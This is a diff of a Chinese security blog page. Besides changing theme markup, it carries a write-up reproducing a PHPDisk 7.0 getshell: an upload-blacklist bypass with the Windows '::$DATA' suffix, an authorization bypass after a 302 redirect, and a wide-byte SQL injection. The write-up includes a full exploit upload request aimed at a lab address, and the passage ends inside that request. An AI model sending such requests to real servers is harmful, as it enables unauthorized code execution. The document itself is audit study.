@@ -1,89 +1,226 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>phpdisk前台Getshell(复现) | osword's blog</title><meta name="description" content="前言翻论坛时候看到一篇前台Getshell审计文章，里面综合的姿势很多，遂复现一波@lz1y。复现时候也是要求自己按正常代码审计来实现，也遇到很多坑。 PHPDISKphpdisk是国内最大的网络存储、云存储系统开发及服务提供商，长期专注于网络存储系统开发，是一套采用PHP和MySQL构建的网络硬盘(文件存储管理)系统，可替代传统的FTP文件管理。友好的界面，操作的便捷深受用户的欢迎。可用于网络上"><meta name="keywords" content="代码审计"><meta name="author" content="osword"><meta name="copyright" content="osword"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="phpdisk前台Getshell(复现)"><meta name="twitter:description" content="前言翻论坛时候看到一篇前台Getshell审计文章，里面综合的姿势很多，遂复现一波@lz1y。复现时候也是要求自己按正常代码审计来实现，也遇到很多坑。 PHPDISKphpdisk是国内最大的网络存储、云存储系统开发及服务提供商，长期专注于网络存储系统开发，是一套采用PHP和MySQL构建的网络硬盘(文件存储管理)系统，可替代传统的FTP文件管理。友好的界面，操作的便捷深受用户的欢迎。可用于网络上"><meta name="twitter:image" content="http://zhzhdoai.github.io/img/404.jpg"><meta property="og:type" content="article"><meta property="og:title" content="phpdisk前台Getshell(复现)"><meta property="og:url" content="http://zhzhdoai.github.io/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/"><meta property="og:site_name" content="osword's blog"><meta property="og:description" content="前言翻论坛时候看到一篇前台Getshell审计文章，里面综合的姿势很多，遂复现一波@lz1y。复现时候也是要求自己按正常代码审计来实现，也遇到很多坑。 PHPDISKphpdisk是国内最大的网络存储、云存储系统开发及服务提供商，长期专注于网络存储系统开发，是一套采用PHP和MySQL构建的网络硬盘(文件存储管理)系统，可替代传统的FTP文件管理。友好的界面，操作的便捷深受用户的欢迎。可用于网络上"><meta property="og:image" content="http://zhzhdoai.github.io/img/404.jpg"><meta property="article:published_time" content="2019-07-09T13:06:36.000Z"><meta property="article:modified_time" content="2020-05-15T08:27:50.000Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
-var t = Cookies.get("theme")
-if (autoChangeMode == '1'){
-  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
-  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
-  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
-  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
 
-  if (t === undefined){
-    if (isLightMode) activateLightMode()
-    else if (isDarkMode) activateDarkMode()
-    else if (isNotSpecified || hasNoSupport){
-      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
-      var now = new Date()
-      var hour = now.getHours()
-      var isNight = hour < 6 || hour >= 18
-      isNight ? activateDarkMode() : activateLightMode()
-  }
-  } else if (t == 'light') activateLightMode()
-  else activateDarkMode()
 
-} else if (autoChangeMode == '2'){
-  now = new Date();
-  hour = now.getHours();
-  isNight = hour < 6 || hour >= 18
-  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
-  else if (t === 'light') activateLightMode()
-  else activateDarkMode() 
-} else {
-  if ( t == 'dark' ) activateDarkMode()
-  else if ( t == 'light') activateLightMode()
-}
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
 
-function activateDarkMode(){
-  document.documentElement.setAttribute('data-theme', 'dark')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
-  }
-}
-function activateLightMode(){
-  document.documentElement.setAttribute('data-theme', 'light')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
-  }
-}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://zhzhdoai.github.io/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/"><link rel="prev" title="PHP文件上传漏洞总结" href="http://zhzhdoai.github.io/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"><link rel="next" title="Flask框架学习笔记" href="http://zhzhdoai.github.io/2019/07/08/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  bookmark: {
-    message_prev: '按',
-    message_next: '键将本页加入书签'
-  },
-  runtime_unit: '天',
-  runtime: true,
-  copyright: undefined,
-  ClickShowText: undefined,
-  medium_zoom: false,
-  fancybox: true,
-  Snackbar: undefined,
-  baiduPush: false,
-  highlightCopy: true,
-  highlightLang: true,
-  highlightShrink: 'false',
-  isFontAwesomeV5: false,
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isanchor: false
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-}</script><script>var GLOBAL_CONFIG_SITE = { 
-  isPost: true,
-  isHome: false,
-  isSidebar: true  
-  }</script><noscript><style>
-#page-header {
-  opacity: 1
-}
-.justified-gallery img{
-  opacity: 1
-}
-</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">139</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">36</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHPDISK"><span class="toc-number">2.</span> <span class="toc-text">PHPDISK</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#路由和全局变量过滤情况"><span class="toc-number">3.</span> <span class="toc-text">路由和全局变量过滤情况</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#复现环境"><span class="toc-number">4.</span> <span class="toc-text">复现环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞成因"><span class="toc-number">5.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows环境下文件上传绕过"><span class="toc-number">6.</span> <span class="toc-text">windows环境下文件上传绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#黑名单"><span class="toc-number">6.0.1.</span> <span class="toc-text">黑名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过方式"><span class="toc-number">6.0.2.</span> <span class="toc-text">绕过方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#权限绕过"><span class="toc-number">7.</span> <span class="toc-text">权限绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#宽字节注入"><span class="toc-number">8.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞复现"><span class="toc-number">9.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#越权上传文件"><span class="toc-number">9.1.</span> <span class="toc-text">越权上传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入获取文件名"><span class="toc-number">9.2.</span> <span class="toc-text">sql注入获取文件名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl传入data值"><span class="toc-number">9.3.</span> <span class="toc-text">curl传入data值</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">10.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/404.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">osword's blog</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">phpdisk前台Getshell(复现)</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2019-07-09 21:06:36"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-07-09</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-05-15 16:27:50"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-05-15</span></time></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>翻论坛时候看到一篇前台Getshell审计文章，里面综合的姿势很多，遂复现一波<a href="https://xz.aliyun.com/t/5594#toc-5" target="_blank" rel="noopener">@lz1y</a>。复现时候也是要求自己按正常代码审计来实现，也遇到很多坑。</p>
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>phpdisk前台Getshell(复现) - osword&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-07-09 21:06" pubdate>
+        2019年7月9日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      15
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">phpdisk前台Getshell(复现)</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>翻论坛时候看到一篇前台Getshell审计文章，里面综合的姿势很多，遂复现一波<a href="https://xz.aliyun.com/t/5594#toc-5" target="_blank" rel="noopener">@lz1y</a>。复现时候也是要求自己按正常代码审计来实现，也遇到很多坑。</p>
 <h1 id="PHPDISK"><a href="#PHPDISK" class="headerlink" title="PHPDISK"></a>PHPDISK</h1><p>phpdisk是国内最大的网络存储、云存储系统开发及服务提供商，长期专注于网络存储系统开发，是一套采用PHP和MySQL构建的网络硬盘(文件存储管理)系统，可替代传统的FTP文件管理。友好的界面，操作的便捷深受用户的欢迎。可用于网络上文件办公、共享、传递、查看的多用户文件存储系统。<br>最新版的下载地址为:<br><a href="http://bbs1.phpdisk.com/thread-5384-1-1.html" target="_blank" rel="noopener">http://bbs1.phpdisk.com/thread-5384-1-1.html</a></p>
 <h1 id="路由和全局变量过滤情况"><a href="#路由和全局变量过滤情况" class="headerlink" title="路由和全局变量过滤情况"></a>路由和全局变量过滤情况</h1><p>路由比较简单/文件名?action=xxx<br>存在全局过滤操作dosafe.php，几乎过滤所有的sql注入的参数</p>
 <h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><blockquote>
@@ -96,30 +233,333 @@ function activateLightMode(){
 </ol>
 <h1 id="windows环境下文件上传绕过"><a href="#windows环境下文件上传绕过" class="headerlink" title="windows环境下文件上传绕过"></a>windows环境下文件上传绕过</h1><p>先通过黑盒审计方式随手上传一个php文件，发现文件名以xxxx.php.txt方式显示。白盒审计找到文件名变化处判断是否可以绕过</p>
 <p><strong>/upload/modules/upload.inc.php</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file_ext &#x3D; get_real_ext($file_extension);</span><br><span class="line"></span><br><span class="line">$dest_file &#x3D; $file_real_path.$file_store_path.$file_real_name_store.$file_ext;</span><br></pre></td></tr></table></figure>
-<p>溯源操作该变量的关键逻辑和方法<code>get_real_ext</code><br><img src="./1.png" alt=""></p>
-<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;filter_extension&#39; &#x3D;&gt; &#39;asp,asa,aspx,ascx,dtd,xsd,xsl,xslt,as,wml,java,vtm,vtml,jst,asr,php,php3,php4,php5,vb,vbs,jsf,jsp,pl,cgi,js,html,htm,xhtml,xml,css,shtm,cfm,cfml,shtml,bat,sh&#39;,</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs arcade"><span class="hljs-symbol">$file</span>_ext = get_real_ext(<span class="hljs-symbol">$file</span>_extension);
+
+<span class="hljs-symbol">$dest</span>_file = <span class="hljs-symbol">$file</span>_real_path.<span class="hljs-symbol">$file</span>_store_path.<span class="hljs-symbol">$file</span>_real_name_store.<span class="hljs-symbol">$file</span>_ext;</code></pre>
+<p>溯源操作该变量的关键逻辑和方法<code>get_real_ext</code><br><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
+<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><pre><code class="hljs ocaml"><span class="hljs-symbol">'filter_extension'</span> =&gt; <span class="hljs-symbol">'asp</span>,asa,aspx,ascx,dtd,xsd,xsl,xslt,<span class="hljs-keyword">as</span>,wml,java,vtm,vtml,jst,<span class="hljs-keyword">asr</span>,php,php3,php4,php5,vb,vbs,jsf,jsp,pl,cgi,js,html,htm,xhtml,xml,css,shtm,cfm,cfml,shtml,bat,sh',</code></pre>
 
 <h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><p>php在window的时候如果文件名+<code>”::$DATA”</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名.且保持<code>”::$DATA”</code>之前的文件名。</p>
-<h1 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h1><p>文件上传入口文件是在mydisk.php，判断用户登录权限为<code>phpdisk_core::user_login()</code>跟进函数查看逻辑<br><img src="./2.png" alt=""><br>执行完之后进行302跳转，并未结束程序,可以继续执行mydisk.php代码</p>
-<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>由于该cms存在gbk版本，有编码操作，全局搜索iconv。如果使用不当可以绕过转义<br>/upload/ajax.php case ‘uploadCloud’下存在宽字节注入.可利用是在else语句，通过base64_encode可以绕过全局sql过滤.<br><img src="./3.png" alt=""><br>$data值可控，且执行sql语句使用iconv编码为gbk</p>
-<p>跟进sql_arrary($ins)函数，观察sql语句组合情况。使用sprintf格式化，函数返回通过逗号拆分语句<br><img src="./4.png" alt=""></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="越权上传文件"><a href="#越权上传文件" class="headerlink" title="越权上传文件"></a>越权上传文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;phpdisk_v7.0_gbk&#x2F;upload&#x2F;mydisk.php?item&#x3D;upload&amp;is_public&#x3D;0&amp;cate_id&#x3D;0&amp;subcate_id&#x3D;0&amp;folder_node&#x3D;0&amp;folder_id&#x3D;-1&amp;uid&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.56.101</span><br><span class="line">Content-Length: 747</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.56.101</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;73.0.3683.86 Safari&#x2F;537.36</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">X-Requested-With: ShockwaveFlash&#x2F;32.0.0.207</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.56.101&#x2F;phpdisk_v7.0_gbk&#x2F;upload&#x2F;mydisk.php?item&#x3D;upload&amp;is_public&#x3D;&amp;cate_id&#x3D;&amp;subcate_id&#x3D;&amp;folder_node&#x3D;0&amp;folder_id&#x3D;-1&amp;uid&#x3D;1&amp;___t0.043556519769546664</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: PHPSESSID&#x3D;g2jf402oh26ig6pqftcrjsdpr5; XDEBUG_SESSION&#x3D;PHPSTORM</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Filename&quot;</span><br><span class="line"></span><br><span class="line">shell.php</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;desc11&quot;</span><br><span class="line"></span><br><span class="line">desc112</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;task&quot;</span><br><span class="line"></span><br><span class="line">doupload</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_id&quot;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;shell.php::$DATA&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">phpinfo();</span><br><span class="line"></span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Submit Query</span><br><span class="line">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2--</span><br></pre></td></tr></table></figure>
-<p><img src="./5.png" alt=""></p>
+<h1 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h1><p>文件上传入口文件是在mydisk.php，判断用户登录权限为<code>phpdisk_core::user_login()</code>跟进函数查看逻辑<br><img src="./2.png" srcset="/img/loading.gif" alt=""><br>执行完之后进行302跳转，并未结束程序,可以继续执行mydisk.php代码</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>由于该cms存在gbk版本，有编码操作，全局搜索iconv。如果使用不当可以绕过转义<br>/upload/ajax.php case ‘uploadCloud’下存在宽字节注入.可利用是在else语句，通过base64_encode可以绕过全局sql过滤.<br><img src="./3.png" srcset="/img/loading.gif" alt=""><br>$data值可控，且执行sql语句使用iconv编码为gbk</p>
+<p>跟进sql_arrary($ins)函数，观察sql语句组合情况。使用sprintf格式化，函数返回通过逗号拆分语句<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="越权上传文件"><a href="#越权上传文件" class="headerlink" title="越权上传文件"></a>越权上传文件</h2><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/phpdisk_v7.0_gbk/upload/mydisk.php?item=upload&amp;is_public=0&amp;cate_id=0&amp;subcate_id=0&amp;folder_node=0&amp;folder_id=-1&amp;uid=1</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 192.168.56.101
+<span class="hljs-attribute">Content-Length</span>: 747
+<span class="hljs-attribute">Origin</span>: http://192.168.56.101
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
+<span class="hljs-attribute">Content-Type</span>: multipart/form-data; boundary=----------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">X-Requested-With</span>: ShockwaveFlash/32.0.0.207
+<span class="hljs-attribute">Referer</span>: http://192.168.56.101/phpdisk_v7.0_gbk/upload/mydisk.php?item=upload&amp;is_public=&amp;cate_id=&amp;subcate_id=&amp;folder_node=0&amp;folder_id=-1&amp;uid=1&amp;___t0.043556519769546664
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+<span class="hljs-attribute">Cookie</span>: PHPSESSID=g2jf402oh26ig6pqftcrjsdpr5; XDEBUG_SESSION=PHPSTORM
+<span class="hljs-attribute">Connection</span>: close
+
+------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2
+<span class="hljs-attribute">Content-Disposition</span>: form-data; name="Filename"
+
+<span class="hljs-attribute">shell.php</span>
+<span class="hljs-attribute">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>
+<span class="hljs-attribute">Content-Disposition</span>: form-data; name="desc11"
+
+<span class="hljs-attribute">desc112</span>
+<span class="hljs-attribute">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>
+<span class="hljs-attribute">Content-Disposition</span>: form-data; name="task"
+
+<span class="hljs-attribute">doupload</span>
+<span class="hljs-attribute">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>
+<span class="hljs-attribute">Content-Disposition</span>: form-data; name="file_id"
+
+<span class="hljs-attribute">0</span>
